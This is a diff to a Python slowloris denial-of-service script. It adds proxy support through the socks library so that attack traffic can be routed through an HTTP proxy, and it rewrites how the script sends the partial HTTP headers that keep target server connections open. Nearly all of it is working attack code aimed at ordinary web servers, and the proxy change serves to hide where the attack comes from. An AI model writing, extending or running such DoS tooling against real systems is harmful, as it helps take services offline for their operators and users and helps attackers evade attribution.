@@ -4,20 +4,10 @@ import time
 import random
 import socket
 import logging
+import socks
 from store import store_data
 from urllib.parse import urlparse
 
-
-class _(socket.socket):
-
-    def send_line(self, line):
-        self.send(line.encode("utf-8"))
-
-    def send_header(self, name, value):
-        self.send_line(f"{name}: {value}")
-
-
-socket.socket = _
 
 _list_of_sockets = []
 
@@ -49,13 +39,21 @@ class start_attack():
 
     @classmethod
     def initialize_socket(self, m):
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s = socks.socksocket()
         s.settimeout(4)
+        if m.p == True:
+            try:
+                s.set_proxy(socks.HTTP, m.socket_ip, m.socket_port)
+            except:
+                logging.debug("No proxyport or no proxyhost specified")
+                SystemExit
+        socket.socket = socks.socksocket
         s.connect((m.host, m.port))
         if m.port == 443:
             s = ssl.wrap_socket(s)
         for line in m.lines:
-            s.send_line(line)
+            s.send(line.encode("utf-8"))
 
         return s
 
@@ -66,7 +64,8 @@ class start_attack():
         try:
             for s in list(_list_of_sockets):
                 try:
-                    s.send_header("X-a", random.randint(1, 5000))
+                    x = f"X-a: {random.randint(1, 5000)}"
+                    s.send(x.encode("utf-8"))
                 except socket.error:
                     _list_of_sockets.remove(s)
 
@@ -84,3 +83,4 @@ class start_attack():
         except (KeyboardInterrupt, SystemExit):
             logging.info("slowloris attack has been stopped")
             break
+
